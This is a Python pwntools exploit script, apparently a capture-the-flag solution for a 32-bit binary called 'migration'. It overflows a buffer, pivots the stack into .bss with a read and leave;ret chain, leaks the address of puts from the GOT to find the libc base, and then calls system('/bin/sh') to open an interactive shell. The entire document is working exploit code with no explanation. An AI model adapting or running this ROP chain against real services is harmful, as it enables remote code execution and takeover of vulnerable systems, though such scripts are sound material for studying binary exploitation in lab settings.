from pwn import *

context.log_level = 'debug'
#r = remote('127.0.0.1',4000)
r = process('./migration')
lib = ELF('./libc.so.6')
elf = ELF('./migration')

read_plt = elf.symbols['read']
puts_plt = elf.symbols['puts']
read_got = elf.got['read']
puts_got = elf.got['puts']
puts_lib = lib.symbols['puts']
system_lib = lib.symbols['system']

buf = elf.bss() + 0x500
buf2 = elf.bss() + 0x400

pop_ebx = 0x0804836d
leave_ret = 0x08048418

r.recvuntil(':\n')

# mov stack to bss + 0x500
payload1 = 'a'*40 + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf) +p32(0x100)

r.send(payload1)
sleep(0.1)
# leak libc
payload2 = p32(buf2) + p32(puts_plt) + p32(pop_ebx) + p32(puts_got) + p32(read_plt) + p32(leave_ret)
payload2 += p32(0) + p32(buf2) + p32(0x100)

r.send(payload2)
sleep(0.1)
puts_addr = u32(r.recv(4))

print "puts_addr:" + hex(puts_addr)

libc_base = puts_addr - puts_lib
print "libc base is " + hex(libc_base)
system_addr = libc_base + system_lib
binsh_libc = lib.search("/bin/sh").next()
binsh = binsh_libc + libc_base
payload3 = p32(buf) + p32(system_addr) + 'bbbb' + p32(binsh)
r.send(payload3)
sleep(0.1)

r.interactive()
